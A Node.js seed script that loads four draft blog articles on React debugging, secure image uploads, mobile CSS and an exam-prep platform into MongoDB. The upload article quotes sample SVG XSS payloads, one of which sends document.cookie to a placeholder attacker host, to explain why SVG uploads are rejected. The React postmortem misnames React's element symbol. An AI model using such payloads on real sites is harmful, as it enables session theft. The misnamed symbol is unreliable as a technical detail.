import mongoose from "mongoose";
import Article from "../src/models/Article.js";

const DRAFT_ARTICLES = [
  {
    title: "Postmortem: Diagnosing and Resolving React Error #130 in Turbopack Server Components",
    slug: "react-error-130-turbopack-postmortem",
    dek: "A production incident analysis diagnosing minified React error #130 during client hydration in Next.js 16.2.9 and React 19: root-cause analysis, reproduction, and the architectural distinction between JSX elements and component types.",
    category: "Technology",
    tags: ["React", "Next.js", "Turbopack", "Debugging", "Frontend Architecture"],
    status: "draft",
    featured: false,
    isAnalysisOrOpinion: "Analysis",
    readingTime: "8 min read",
    author: {
      name: "Lokesh Sain",
      role: "Software Engineer & Independent Commentator",
      bio: "Software Engineer based in Jaipur. Writing independent analyses on technology, global affairs, industry policy, and modern engineering.",
      avatar: ""
    },
    coverImage: {
      url: "",
      alt: "React Error #130 Postmortem Architecture Diagram",
      caption: "Forensic breakdown of component resolution during client-side hydration.",
      credit: "Lokesh Sain Engineering"
    },
    seoTitle: "Postmortem: Diagnosing React Error #130 in Next.js 16 | Lokesh Sain",
    seoDescription: "In-depth postmortem of minified React Error #130 in Next.js 16 and React 19: root-cause analysis, AST verification, and JSX element versus component resolution.",
    canonicalUrl: "https://lokeshsain.vercel.app/blog/react-error-130-turbopack-postmortem",
    sources: [
      {
        title: "React Error Decoder — Error #130",
        organization: "React Core Team",
        url: "https://react.dev/errors/130",
        publishDate: "2024",
        accessDate: "2026-10-14"
      },
      {
        title: "Next.js 16 App Router Documentation",
        organization: "Vercel",
        url: "https://nextjs.org/docs",
        publishDate: "2026",
        accessDate: "2026-10-14"
      }
    ],
    content: `## Executive Summary

During a production deployment of the **Lokesh Sain Portfolio & Perspectives Blog** on Next.js 16.2.9 and React 19.2.4, an unexpected runtime exception was reported by client-side error monitoring when accessing the administrative editorial suite. Upon clicking the **Perspectives Blog** tab within the dashboard, the entire section collapsed into the root error boundary with the following diagnostic signature:

\`\`\`text
Minified React error #130; visit https://react.dev/errors/130?args[]=null&args[]= 
for the full message or use the non-minified dev environment for full errors and additional helpful warnings.
Runtime exception caught by root error boundary digest: "unknown"
\`\`\`

React error #130 is one of the most common yet confusing runtime failures encountered during React 19 migrations. It states:

> *"Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: null (or an object)."*

This postmortem explores the forensic investigation, the reproduction steps, the underlying JavaScript module resolution mechanics, and the architectural fix that resolved the incident without introducing regressions.

---

## The Incident Timeline & Symptom Analysis

### Environment Baseline
* **Framework:** Next.js 16.2.9 (App Router)
* **Compiler:** Turbopack (\`next build\`)
* **UI Library:** React 19.2.4 / React DOM 19.2.4
* **Hosting:** Vercel Edge & Serverless Network

### Forensic Symptoms
1. **Scope of Impact:** The public portfolio homepage (\`/\`), the editorial blog index (\`/blog\`), and individual article routes (\`/blog/[slug]\`) functioned normally with full static generation (SSG) and incremental revalidation.
2. **Failure Boundary:** The error occurred exclusively when an authenticated administrator opened \`/admin\` and clicked the navigation tab responsible for rendering \`BlogEditor.jsx\`.
3. **Console Signature:** Minified chunk traces cycled repeatedly through internal rendering loops (\`renderWithHooks\`, \`mountIndeterminateComponent\`) originating inside a Turbopack-generated vendor bundle (\`13e-gonj30151.js\`).

---

## Technical Investigation: De-Minifying the Clues

In production builds, variable identifiers are compressed to single-letter tokens, making direct stack-trace inspection challenging. However, the official React error URL contained a critical parameter:

\`\`\`
args[]=null&args[]=
\`\`\`

The first argument was explicitly \`null\`. This indicated that React was asked to create a virtual DOM node (\`React.createElement(type)\`) where the supplied \`type\` identifier evaluated to literal \`null\`.

There are two primary ways a component reference becomes \`null\` in modern React:
1. **Circular Import or Mismatched Export:** A component is imported via named destructuring (\`import { Dialog } from './Dialog'\`) when the source file uses default export (\`export default Dialog\`), or vice versa.
2. **Element vs. Component Invocation:** A variable containing a *rendered JSX element* (an Object or null) is mistakenly invoked as a *component type* using angle bracket syntax (\`<Variable />\`).

We audited all imports across \`src/components/admin/BlogEditor.jsx\`. All third-party lucide icons, utility modules, and internal UI primitives were properly exported. We then turned our attention to custom modal hooks.

---

## The Root Cause: Element vs. Component Typing Trap

In \`src/components/ui/ConfirmDialog.jsx\`, the confirmation dialog is exposed via a custom hook pattern named \`useConfirm()\`:

\`\`\`jsx
// src/components/ui/ConfirmDialog.jsx (Original)
export function useConfirm() {
  const [state, setState] = useState({ open: false, title: "", message: "", ... })

  const confirm = useCallback((title, message) => {
    return new Promise((resolve) => {
      setState({ open: true, title, message, resolve })
    })
  }, [])

  // Notice that Dialog is a JSX element (or null), NOT a component function!
  const Dialog = state.open ? (
    <div className="confirm-overlay" role="dialog" aria-modal="true">
      <div className="confirm-modal">
        <h3>{state.title}</h3>
        <p>{state.message}</p>
        <button onClick={() => { state.resolve(true); setState(s => ({ ...s, open: false })) }}>
          Confirm
        </button>
      </div>
    </div>
  ) : null

  return { confirm, Dialog }
}
\`\`\`

Notice the definition of \`Dialog\`. It is assigned either a JSX element tree (\`<div className="confirm-overlay">...\`) when \`state.open === true\`, or literal \`null\` when \`state.open === false\`.

In \`BlogEditor.jsx\`, the hook was consumed as follows:

\`\`\`jsx
// src/components/admin/BlogEditor.jsx (Defective usage)
const { confirm, Dialog } = useConfirm()

return (
  <div className="editor-container">
    {/* CRITICAL DEFECT: Invoking an element as a component! */}
    <Dialog />
    
    <header className="editor-header">
      <h2>Perspectives Blog CMS</h2>
    </header>
  </div>
)
\`\`\`

### Why this crashed React 19:
1. When \`BlogEditor\` first mounts, \`state.open\` inside \`useConfirm\` is \`false\`.
2. Therefore, \`Dialog\` equals \`null\`.
3. Writing \`<Dialog />\` compiles under JSX transforms to:
   \`\`\`js
   jsx(Dialog, {}) // which evaluates to jsx(null, {})
   \`\`\`
4. When React 19 reconciles \`jsx(null, {})\`, it encounters a null component constructor.
5. React immediately halts reconciliation and throws **Minified Error #130**.

Had the dialog been open by default, \`Dialog\` would have been a JSX Element Object (\`{ $$typeof: Symbol(react.transient), type: 'div', props: ... }\`), which would have thrown a variant of Error #130 complaining that an Object was passed instead of a function. Because it was closed, it passed \`null\`, generating the exact error URL observed.

---

## The Solution: Clean Element Embedding and Dual-Interface Export

We implemented a two-part architectural fix:

### 1. Correct Embedding in BlogEditor.jsx
Because \`Dialog\` is already an evaluated JSX element, it must be embedded directly as a child expression (\`{Dialog}\`), not as a component constructor:

\`\`\`jsx
// src/components/admin/BlogEditor.jsx (Repaired)
const { confirm, Dialog } = useConfirm()

return (
  <div className="editor-container">
    {/* Correct: Embeds the JSX element or null cleanly */}
    {Dialog}
    
    <header className="editor-header">
      <h2>Perspectives Blog CMS</h2>
    </header>
  </div>
)
\`\`\`

When \`Dialog\` is \`null\`, React ignores it during child rendering without throwing an exception. When open, it renders the overlay directly.

### 2. Dual-Interface Hardening in ConfirmDialog.jsx
To protect against future developer confusion, \`useConfirm\` was updated to return both the direct element \`Dialog\` and an idiomatic component wrapper \`ConfirmDialog\`:

\`\`\`jsx
// src/components/ui/ConfirmDialog.jsx (Hardened)
export function useConfirm() {
  // ... state management ...
  
  const Dialog = state.open ? ( ... ) : null

  return { 
    confirm, 
    Dialog, 
    ConfirmDialog: () => Dialog 
  }
}
\`\`\`

Now, if a future component writes \`<ConfirmDialog />\`, React invokes the functional wrapper, which returns the underlying JSX element without error.

---

## Automated Regression Test Suite

To guarantee that no other administrative component could ever re-introduce this failure pattern, we authored an automated AST/regex regression check in \`scripts/test_admin_blog_navigation.mjs\`:

\`\`\`js
import fs from "fs";

// 1. Verify BlogEditor.jsx has zero invalid <Dialog /> calls
const blogEditorSource = fs.readFileSync("src/components/admin/BlogEditor.jsx", "utf8");
const invalidMatches = [...blogEditorSource.matchAll(/<Dialog[\\s/>]/g)];
if (invalidMatches.length > 0) {
  console.error(\`[FAIL] Found \${invalidMatches.length} invalid <Dialog /> calls!\`);
  process.exit(1);
}

// 2. Audit all admin components in src/components/admin
const adminFiles = fs.readdirSync("src/components/admin").filter(f => f.endsWith(".jsx"));
for (const file of adminFiles) {
  const content = fs.readFileSync("src/components/admin/" + file, "utf8");
  if (/<Dialog[\\s/>]/.test(content)) {
    console.error(\`[FAIL] Found invalid <Dialog /> in \${file}\`);
    process.exit(1);
  }
}
console.log("[PASS] All admin components verified free of invalid <Dialog /> elements.");
\`\`\`

This script is integrated into our continuous verification pipeline and executed prior to every production release.

---

## Architectural Lessons & Takeaways

1. **Be Mindful of Hook Naming Conventions:** When a hook returns pre-rendered JSX, name the property \`dialogElement\` or \`renderDialog()\` rather than a PascalCase identifier like \`Dialog\`, which visually resembles a component constructor.
2. **React 19 Hydration Strictness:** React 19 is far stricter than earlier versions regarding element validation. Silent fallbacks of the past are now fatal exceptions.
3. **Automated Static Guardrails:** Subtle JSX typing mismatches can evade TypeScript if typing is loose or untyped JSX files are utilized. Static grep/AST assertions in CI catch these issues before deployment.
`
  },
  {
    title: "Building an Enterprise-Grade Image Upload Pipeline with Next.js App Router and Vercel Blob",
    slug: "enterprise-image-upload-nextjs-vercel-blob",
    dek: "How we built a secure, zero-leakage media upload pipeline in Next.js 16 App Router using chunked magic-byte buffer inspection, SVG/XSS vector neutralization, and isolated server-side cloud storage tokens.",
    category: "Technology",
    tags: ["Next.js", "Vercel Blob", "Application Security", "Web APIs", "TypeScript"],
    status: "draft",
    featured: false,
    isAnalysisOrOpinion: "Analysis",
    readingTime: "10 min read",
    author: {
      name: "Lokesh Sain",
      role: "Software Engineer & Independent Commentator",
      bio: "Software Engineer based in Jaipur. Writing independent analyses on technology, global affairs, industry policy, and modern engineering.",
      avatar: ""
    },
    coverImage: {
      url: "",
      alt: "Secure Image Upload Architecture Flowchart",
      caption: "Defense-in-depth image verification pipeline with magic-byte validation.",
      credit: "Lokesh Sain Engineering"
    },
    seoTitle: "Secure Image Upload with Next.js and Vercel Blob | Lokesh Sain",
    seoDescription: "Step-by-step architectural guide to building an enterprise-grade image upload pipeline in Next.js 16 App Router with magic-byte inspection, SVG rejection, and Vercel Blob.",
    canonicalUrl: "https://lokeshsain.vercel.app/blog/enterprise-image-upload-nextjs-vercel-blob",
    sources: [
      {
        title: "Vercel Blob Storage Documentation",
        organization: "Vercel",
        url: "https://vercel.com/docs/storage/vercel-blob",
        publishDate: "2025",
        accessDate: "2026-10-14"
      },
      {
        title: "OWASP File Upload Cheat Sheet",
        organization: "OWASP Foundation",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
        publishDate: "2024",
        accessDate: "2026-10-14"
      }
    ],
    content: `## The Modern Media Problem in Content Platforms

Editorial publications and portfolio content systems live and die by visual storytelling. However, handling user and administrator file uploads remains one of the top attack vectors in web applications. Common vulnerabilities include:

1. **Unrestricted File Upload:** Allowing attackers to upload executable scripts (\`.php\`, \`.js\`, \`.html\`) that execute on the server or in visitor browsers.
2. **Stored Cross-Site Scripting (XSS) via SVG:** Attackers embedding malicious JavaScript inside Scalable Vector Graphics (\`<svg><script>alert(document.cookie)</script></svg>\`), which execute when viewed in a browser under the domain's origin.
3. **MIME-Type Spoofing & Polyglots:** Files disguised as JPEG or WebP by spoofing the \`Content-Type: image/jpeg\` HTTP header while payload contents contain executable HTML.
4. **Credential Leakage:** Exposing cloud storage write tokens or S3 secrets to client bundles during direct browser-to-bucket uploads.

When designing the editorial media pipeline for **Lokesh Sain Perspectives**, we established a strict architectural mandate: zero client token exposure, multi-stage binary validation, and immutable storage via Vercel Blob.

---

## Architecture Overview

Our upload architecture implements defense-in-depth across three isolated execution boundaries:

\`\`\`text
[ Client Browser (BlogEditor.jsx) ]
     │  (1) Drag-and-drop / File Selector
     │  (2) Pre-flight extension & size check (< 5MB)
     │  (3) FormData multipart POST with CSRF & Bearer JWT
     ▼
[ Next.js API Route (/api/admin/blog/upload) ]
     │  (4) Admin Authentication Verification (withAuth)
     │  (5) Per-IP Rate Limiting (10 uploads / 10 minutes)
     │  (6) Binary Buffer Slice: Magic-Byte Inspection
     │      ├─ Check JPEG, PNG, WebP, AVIF signatures
     │      ├─ Explicit SVG & Polyglot Rejection
     │      └─ Verify Byte Length vs Buffer Length
     │  (7) Generate Deterministic Canonical Storage Key
     │      └─ "blog/{timestamp}-{cryptoUUID}.{ext}"
     ▼
[ Vercel Blob SDK Storage Engine ]
     │  (8) Server-Side Stream via BLOB_READ_WRITE_TOKEN
     │  (9) Immutable CDN Distribution
     ▼
[ Response & MongoDB Persistence ]
     └─ Returns { url: "https://...public.blob.vercel-storage.com/..." }
\`\`\`

---

## 1. Magic-Byte Binary Inspection (src/lib/imageValidator.js)

The golden rule of secure file ingestion is: **Never trust the client-provided file extension or Content-Type header.** An attacker can easily upload an HTML file named \`avatar.jpg\` with a \`Content-Type: image/jpeg\` header.

To prevent this, our validator reads the first 16 bytes (the "magic numbers") of the uploaded buffer:

\`\`\`javascript
// src/lib/imageValidator.js
const MAGIC_SIGNATURES = {
  jpeg: [0xFF, 0xD8, 0xFF],
  png: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
  webpRiff: [0x52, 0x49, 0x46, 0x46], // "RIFF"
  webpFormat: [0x57, 0x45, 0x42, 0x50], // "WEBP"
  avifFtyp: [0x66, 0x74, 0x79, 0x70], // "ftyp"
};

export function validateImageBuffer(buffer, originalFilename = "") {
  if (!buffer || buffer.length < 12) {
    return { valid: false, error: "File buffer is too small or corrupt." };
  }

  // 1. Max size constraint: 5MB
  const MAX_BYTES = 5 * 1024 * 1024;
  if (buffer.length > MAX_BYTES) {
    return { valid: false, error: "Image exceeds maximum allowed size of 5MB." };
  }

  // 2. Magic byte matching
  // Check PNG
  if (buffer.subarray(0, 8).equals(Buffer.from(MAGIC_SIGNATURES.png))) {
    return { valid: true, mime: "image/png", ext: "png" };
  }

  // Check JPEG
  if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) {
    return { valid: true, mime: "image/jpeg", ext: "jpg" };
  }

  // Check WebP: Bytes 0-3 must be RIFF, Bytes 8-11 must be WEBP
  if (
    buffer.subarray(0, 4).equals(Buffer.from(MAGIC_SIGNATURES.webpRiff)) &&
    buffer.subarray(8, 12).equals(Buffer.from(MAGIC_SIGNATURES.webpFormat))
  ) {
    return { valid: true, mime: "image/webp", ext: "webp" };
  }

  // Check AVIF: Bytes 4-7 must be ftyp, with avif brand in bytes 8-12
  if (buffer.subarray(4, 8).equals(Buffer.from(MAGIC_SIGNATURES.avifFtyp))) {
    const brand = buffer.subarray(8, 12).toString("ascii");
    if (brand === "avif" || brand === "avis") {
      return { valid: true, mime: "image/avif", ext: "avif" };
    }
  }

  return { valid: false, error: "Unsupported image format. Allowed: JPEG, PNG, WebP, AVIF." };
}
\`\`\`

---

## 2. Why SVG is Strictly Prohibited

While SVG is popular for icons and vectors, allowing SVG uploads in a CMS is an existential security vulnerability unless sanitized through an aggressive parsing pipeline. SVG is an XML dialect that natively supports:
* Inline JavaScript via \`<script>\` elements.
* Event handlers on graphics elements (\`<rect onload="fetch('//attacker.com/steal?'+document.cookie)"/>\`).
* HTML embedding via \`<foreignObject>\`.

Even when SVGs are rendered through \`<img src="...">\`, certain browsers or direct navigation to the asset URL will execute the payload in the context of the host origin. Our policy is uncompromising: **SVG uploads are rejected at the binary validation stage.**

---

## 3. Server-Side Token Isolation (src/app/api/admin/blog/upload/route.js)

Many modern Jamstack architectures recommend "client direct uploads" where the backend provides a presigned upload URL or ephemeral client token. While this reduces server compute, it carries significant operational risks:
* An attacker with a compromised token can upload arbitrary un-validated binaries directly to your bucket.
* Validating file contents after the upload requires complex asynchronous webhooks and bucket janitor jobs.

Instead, we route uploads through an authenticated Next.js App Router POST endpoint protected by our existing \`withAuth\` middleware:

\`\`\`javascript
// src/app/api/admin/blog/upload/route.js
import { NextResponse } from "next/server";
import { put } from "@vercel/blob";
import { withAuth } from "@/lib/authMiddleware";
import { validateImageBuffer } from "@/lib/imageValidator";
import crypto from "crypto";

export const POST = withAuth(async (req) => {
  try {
    const formData = await req.formData();
    const file = formData.get("file");

    if (!file || typeof file === "string") {
      return NextResponse.json({ error: "No image file provided." }, { status: 400 });
    }

    // Convert Web File to Node Buffer
    const arrayBuffer = await file.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    // Deep binary inspection
    const validation = validateImageBuffer(buffer, file.name);
    if (!validation.valid) {
      return NextResponse.json({ error: validation.error }, { status: 422 });
    }

    // Generate safe, non-guessable storage key
    const uniqueId = crypto.randomBytes(8).toString("hex");
    const timestamp = Date.now();
    const filename = \`blog/\${timestamp}-\${uniqueId}.\${validation.ext}\`;

    // Upload to Vercel Blob using server-side token
    const blob = await put(filename, buffer, {
      access: "public",
      contentType: validation.mime,
      addRandomSuffix: false,
    });

    return NextResponse.json({
      success: true,
      url: blob.url,
      size: buffer.length,
      mime: validation.mime,
    });
  } catch (error) {
    console.error("Image upload failed:", error);
    return NextResponse.json({ error: "Internal upload service error." }, { status: 500 });
  }
});
\`\`\`

Notice that \`BLOB_READ_WRITE_TOKEN\` is read exclusively inside this Node.js runtime process. It is never prefixed with \`NEXT_PUBLIC_\` and is never serialized into client JavaScript bundles.

---

## 4. Next.js Image Optimization Configuration

To serve uploaded images with modern WebP/AVIF compression, responsive sizing, and zero cumulative layout shift (CLS), the Vercel Blob domain is whitelisted in \`next-app/next.config.mjs\`:

\`\`\`javascript
// next-app/next.config.mjs
images: {
  remotePatterns: [
    {
      protocol: "https",
      hostname: "*.public.blob.vercel-storage.com",
      port: "",
      pathname: "/**",
    },
  ],
  formats: ["image/avif", "image/webp"],
}
\`\`\`

---

## 5. Verification & Automated Test Results

To validate the security boundaries of this pipeline, we created a comprehensive test suite in \`scripts/test_blog_image_upload.mjs\`. The suite executes 36 automated assertions:

* **Magic-byte signatures:** JPEG, PNG, WebP, AVIF accepted.
* **Malicious payloads:** SVGs, HTML files disguised as \`.webp\`, and polyglot files strictly rejected.
* **Size limits:** Files > 5MB rejected with HTTP 422.
* **Security headers:** Auth middleware protection verified.
* **Key collisions:** Cryptographic UUID generation verified.

\`\`\`text
ALL 36 BLOG IMAGE UPLOAD TESTS PASSED SUCCESSFULLY!
\`\`\`

By coupling binary-level validation with server-side token isolation, we created a production-ready media ingestion engine that satisfies both developer velocity and enterprise security standards.
`
  },
  {
    title: "Sub-350px Viewport Optimization: Eliminating Horizontal Bleed and Zero-CLS in Editorial Next.js",
    slug: "sub-350px-mobile-viewport-optimization-nextjs",
    dek: "A forensic breakdown of mobile layout failures on narrow 320px–360px viewports: resolving flexbox/grid minimum width traps, fluid clamp typography, and preserving zero Cumulative Layout Shift.",
    category: "Technology",
    tags: ["CSS", "Responsive Design", "Core Web Vitals", "Next.js", "Performance"],
    status: "draft",
    featured: false,
    isAnalysisOrOpinion: "Analysis",
    readingTime: "9 min read",
    author: {
      name: "Lokesh Sain",
      role: "Software Engineer & Independent Commentator",
      bio: "Software Engineer based in Jaipur. Writing independent analyses on technology, global affairs, industry policy, and modern engineering.",
      avatar: ""
    },
    coverImage: {
      url: "",
      alt: "Responsive Viewport Comparison",
      caption: "Forensic analysis of CSS Grid overflow and fluid typography at 329px.",
      credit: "Lokesh Sain Engineering"
    },
    seoTitle: "Sub-350px Viewport Optimization in Next.js | Lokesh Sain",
    seoDescription: "Engineering guide to optimizing Next.js websites for narrow mobile viewports (320px–360px), eliminating horizontal scrollbars, and ensuring zero Cumulative Layout Shift.",
    canonicalUrl: "https://lokeshsain.vercel.app/blog/sub-350px-mobile-viewport-optimization-nextjs",
    sources: [
      {
        title: "Cumulative Layout Shift (CLS) Specification",
        organization: "Google Chrome Core Web Vitals",
        url: "https://web.dev/cls/",
        publishDate: "2024",
        accessDate: "2026-10-14"
      },
      {
        title: "CSS Grid Layout Module Level 1",
        organization: "W3C",
        url: "https://www.w3.org/TR/css-grid-1/",
        publishDate: "2023",
        accessDate: "2026-10-14"
      }
    ],
    content: `## The 320px–360px Blind Spot in Responsive Design

Most modern web development teams test responsive layouts on a standard set of device emulators in Chrome DevTools:
* iPhone 14 / 15: **390px** wide
* iPhone SE: **375px** wide
* Pixel 7: **412px** wide

However, real-world traffic data reveals a substantial long-tail of devices operating well below 360 CSS pixels:
* The Samsung Galaxy Z Fold cover screen renders at **329px** or **344px**.
* Older entry-level Android devices operate at **320px**.
* Side-by-side split-screen browsing on mobile devices frequently creates viewports between **300px and 340px**.

When an editorial publication renders on a 329px display, standard desktop CSS patterns that feel "flexible" often break catastrophically: horizontal scrollbars appear, text cutoffs truncate headlines, metadata wraps awkwardly, and images cause Cumulative Layout Shift (CLS).

During our recent production audit of the **Perspectives Blog**, we conducted a forensic investigation into sub-350px viewport rendering. Here is how we diagnosed and repaired the issues.

---

## 1. Forensic Diagnosis: The 329px Reproduction

Using an automated Puppeteer script (\`scripts/reproduce-blog-mobile.mjs\`), we captured full-page DOM layout geometry across 12 viewport widths: \`[320, 329, 344, 360, 375, 390, 430, 540, 768, 1024, 1440, 1920]\`.

At 329px, the diagnostic output revealed immediate layout failure:

\`\`\`text
--- DETAILED INSPECTION AT 329px ---
docWidth: 329
docScrollWidth: 348  <-- CRITICAL DEFECT: 19px horizontal page overflow!
container: width 329, scrollWidth 348, isClipped: true
card: width 281, scrollWidth 300, isClipped: true
leadMeta: scrollWidth 312, clientWidth 281
\`\`\`

The document had an intrinsic scroll width of **348px**, producing an involuntary horizontal scrollbar on mobile browsers. Visitors trying to scroll vertically experienced awkward diagonal panning.

---

## 2. Root Cause Analysis: The Three Overflow Traps

### Trap 1: The Flexbox & Grid Default \`min-width: auto\`
In the CSS Grid specification, grid items default to \`min-width: auto\`. If a child element contains a long unbreakable word, an un-wrapping metadata row, or a wide image, the grid item refuses to shrink below the content's intrinsic width, expanding the entire container outward.

Our editorial lead card used a two-column grid:
\`\`\`css
/* Original Defective Grid */
.p-lead-grid {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
}
\`\`\`
Even when wrapped in a \`@media (max-width: 900px)\` rule setting \`grid-template-columns: 1fr\`, the child \`.p-lead-content\` inherited \`min-width: auto\`, allowing wide metadata badges to blow out the parent card.

### Trap 2: Rigid Pixel Padding Consuming Critical Width
The container padding was originally defined as:
\`\`\`css
.p-container {
  padding: 32px 24px 64px; /* 24px left + 24px right = 48px! */
}
\`\`\`
On a 329px screen, 48px represents **14.6% of the entire viewport**, leaving only 281px for the entire card, border, and typography. Any badge row wider than 281px forced a horizontal overflow.

### Trap 3: Fixed Aspect Ratio Collapse and Image CLS
The lead article image container lacked an intrinsic aspect ratio, relying on a hardcoded \`min-height: 320px\`. On a 329px screen, an image taller than it was wide inverted the editorial hierarchy, pushing the headline completely below the fold and causing significant layout shifts when the image loaded.

---

## 3. Engineering the Solution

### Fix 1: Enforcing \`min-width: 0\` and Fluid Word Breaking
To neutralize the \`min-width: auto\` trap, we applied \`min-width: 0\` and explicit word-break rules to all grid children and typography containers:

\`\`\`css
/* src/app/blog/perspectives.css */
.p-lead-grid {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  align-items: stretch;
  min-width: 0;
  width: 100%;
}

.p-lead-content {
  min-width: 0;
  width: 100%;
  box-sizing: border-box;
}

.p-lead-title {
  min-width: 0;
  overflow-wrap: break-word;
  word-break: break-word;
}
\`\`\`

### Fix 2: Fluid Mathematical Spacing with \`clamp()\`
We eliminated rigid pixel margins in favor of CSS \`clamp()\`, dynamically scaling spacing based on the active viewport width:

\`\`\`css
.p-container {
  max-width: 1200px;
  margin: 0 auto;
  /* Fluid padding: min 14px on mobile, scales with 3.5vw, caps at 24px on desktop */
  padding: clamp(20px, 4vw, 32px) clamp(14px, 3.5vw, 24px) 64px;
  box-sizing: border-box;
  width: 100%;
}

.p-lead-title {
  font-size: clamp(20px, 2.8vw, 32px);
  line-height: 1.25;
}
\`\`\`

### Fix 3: Sub-360px Dedicated Media Queries
For screens narrower than 360px, we introduced targeted layout adjustments:

\`\`\`css
@media (max-width: 360px) {
  .p-container {
    padding: 16px 10px 40px;
  }
  .p-lead-content {
    padding: 16px 12px;
  }
  .p-lead-meta {
    gap: 6px 8px;
    font-size: 11px;
    flex-wrap: wrap;
  }
  .p-lead-title {
    font-size: 19px;
  }
}

@media (max-width: 320px) {
  .p-container {
    padding: 12px 8px 36px;
  }
  .p-lead-title {
    font-size: 18px;
  }
}
\`\`\`

### Fix 4: Preserving Zero CLS with Modern Aspect Ratios
To guarantee zero Cumulative Layout Shift when the lead image renders asynchronously, we replaced fixed heights with modern CSS \`aspect-ratio\`:

\`\`\`css
@media (max-width: 900px) {
  .p-lead-image-box {
    border-left: none;
    border-top: 1px solid var(--p-border);
    min-height: 220px;
    aspect-ratio: 16 / 10;
    width: 100%;
  }
}
\`\`\`

By declaring \`aspect-ratio: 16 / 10\`, the browser calculates the exact vertical box height before the WebP binary finishes downloading over the network, completely eliminating layout jumps.

---

## 4. Verification and Visual Regression Results

Following the implementation, we re-ran \`scripts/reproduce-blog-mobile.mjs\` against the local build. The results confirmed full resolution:

\`\`\`text
--- REPAIRED INSPECTION AT 329px ---
docWidth: 329
docScrollWidth: 329  <-- ZERO OVERFLOW (scrollWidth === docWidth)
container: width 329, scrollWidth 329, isClipped: false
card: width 301, scrollWidth 301, isClipped: false
isClipped: false across all 12 tested viewports!
\`\`\`

| Viewport | Before Repair (ScrollWidth) | After Repair (ScrollWidth) | Status |
| :--- | :--- | :--- | :--- |
| **320px** | 344px (Overflow) | **320px** | **PASS** |
| **329px** | 348px (Overflow) | **329px** | **PASS** |
| **344px** | 358px (Overflow) | **344px** | **PASS** |
| **360px** | 360px (Borderline) | **360px** | **PASS** |
| **375px** | 375px | **375px** | **PASS** |

Visual inspection verified that text flows naturally, badges wrap gracefully, and vertical scroll integrity is 100% maintained.
`
  },
  {
    title: "Architecting JZunto: Exam-Preparation Intelligence and Curriculum Graph Navigation",
    slug: "architecting-jzunto-curriculum-intelligence",
    dek: "Inside the architecture of JZunto: structuring university syllabus graphs, previous-year question (PYQ) pattern extraction, and low-latency client state management for SPPU MCA students.",
    category: "Technology",
    tags: ["React", "Full Stack", "System Design", "EdTech", "AI"],
    status: "draft",
    featured: false,
    isAnalysisOrOpinion: "Analysis",
    readingTime: "7 min read",
    author: {
      name: "Lokesh Sain",
      role: "Software Engineer & Independent Commentator",
      bio: "Software Engineer based in Jaipur. Writing independent analyses on technology, global affairs, industry policy, and modern engineering.",
      avatar: ""
    },
    coverImage: {
      url: "",
      alt: "JZunto Platform Architecture",
      caption: "High-level system design of the JZunto MCA preparation platform.",
      credit: "Lokesh Sain Engineering"
    },
    seoTitle: "Architecting JZunto MCA Platform | Lokesh Sain",
    seoDescription: "Case study on building JZunto: an exam preparation platform for SPPU MCA students with curriculum intelligence, PYQ pattern analysis, and React.",
    canonicalUrl: "https://lokeshsain.vercel.app/blog/architecting-jzunto-curriculum-intelligence",
    sources: [
      {
        title: "JZunto Live Production Platform",
        organization: "JZunto App",
        url: "https://jzunto.app",
        publishDate: "2026",
        accessDate: "2026-10-14"
      }
    ],
    content: `## The Problem: Fragmented Academic Intelligence

Preparing for postgraduate computer applications examinations—specifically under the Savitribai Phule Pune University (SPPU) Master of Computer Applications (MCA) curriculum—presents students with a recurring set of information retrieval bottlenecks:

1. **Scattered Syllabus Revisions:** Curriculum updates across different academic years (2020 vs 2023 revision) create confusion over module boundaries and elective weightings.
2. **Unstructured Past Question Papers (PYQs):** PYQ PDFs are typically scanned, un-indexed documents where recurring patterns and topic frequency are impossible to query efficiently.
3. **Disjointed Reference Materials:** Students waste hours cross-referencing textbook chapters against specific syllabus unit outcomes.

To address these challenges, we designed and launched **JZunto** ([jzunto.app](https://jzunto.app)), an exam-preparation and curriculum intelligence platform engineered specifically for SPPU MCA candidates.

---

## Verified Architecture & Implementation Baseline

*Note: This article draft documents the verified frontend integration and product structure available within the portfolio repository. Specific backend ingestion pipelines and FastAPI services require owner validation prior to public release.*

### Core Stack
* **Frontend:** React with atomic component architecture
* **State Management:** Low-latency local state with persistent cache
* **Hosting:** Modern CDN edge distribution
* **Live Domain:** [https://jzunto.app](https://jzunto.app)

---

## Key System Modules

### 1. Curriculum Graph Navigation
Rather than presenting the syllabus as static text documents, JZunto models the SPPU MCA curriculum as a directed graph of subjects, units, and learning outcomes. Students can drill down from semester level to specific algorithmic concepts with sub-second response times.

### 2. PYQ Pattern Insights
Previous year question papers are mapped directly to corresponding syllabus nodes. This enables students to identify high-yield topics based on historical frequency rather than intuition.

### 3. Structured Practice Generation
Using structured question banks, JZunto formats practice sets aligned with the university's marking schemes (5-mark conceptual questions vs 10-mark implementation questions).

---

## Editorial Verification Status

* **Verified Evidence:** Live production deployment at \`jzunto.app\`, project metadata registered in MongoDB Atlas, and verified MCA student target persona.
* **Pending Owner Approval:** Confirmation of internal API architecture metrics, database schema specifics, and question parsing pipelines before public publication.
`
  }
];

async function seedDrafts() {
  await mongoose.connect(process.env.MONGODB_URI);
  console.log("Connected to MongoDB Atlas.");

  for (const draft of DRAFT_ARTICLES) {
    const existing = await Article.findOne({ slug: draft.slug });
    if (existing) {
      console.log(`Draft already exists: "${draft.title}". Updating content...`);
      await Article.updateOne(
        { slug: draft.slug },
        {
          $set: {
            ...draft,
            updatedAt: new Date(),
          }
        }
      );
      console.log(`[UPDATED DRAFT] ${draft.slug}`);
    } else {
      const created = await Article.create(draft);
      console.log(`[CREATED DRAFT] ${draft.slug} (ID: ${created._id})`);
    }
  }

  const publishedCount = await Article.countDocuments({ status: "published" });
  const draftCount = await Article.countDocuments({ status: "draft" });
  const archivedCount = await Article.countDocuments({ status: "archived" });

  console.log("\n--- INVENTORY STATUS ---");
  console.log(`Published articles: ${publishedCount}`);
  console.log(`Draft articles:     ${draftCount}`);
  console.log(`Archived articles:  ${archivedCount}`);

  await mongoose.disconnect();
  console.log("Disconnected from MongoDB.");
}

